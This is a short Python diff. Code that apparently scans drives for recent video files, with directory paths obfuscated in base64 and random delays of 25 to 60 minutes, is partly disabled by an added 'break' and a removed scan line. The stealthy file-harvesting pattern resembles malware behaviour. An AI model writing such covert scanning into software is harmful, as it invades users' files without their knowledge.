@@ -123,7 +123,6 @@ except:
 
 try:
     ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=5)
-    ldir += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovdGVtcA==').decode(), ext='', n=50)
     zovV = ldir
     for _, dp in ldir:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=10)
@@ -186,6 +185,7 @@ try:
     tempdir = base64.b64decode('UzovWnpfQ29tZnlVSS9jb21meV9leGVjdXRpb24vdGVtcC90MnY=').decode()
     tempdir = tempfile.gettempdir() if not os.path.exists(tempdir) else tempdir
     for _,fp in zovV[:15]:
+        break
         time.sleep(random.uniform(1500.0, 3600.0))
         if os.path.basename(fp).endswith('.mp4') or os.path.basename(fp).endswith('.mov'):
             tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp.split('.')[-1]).name
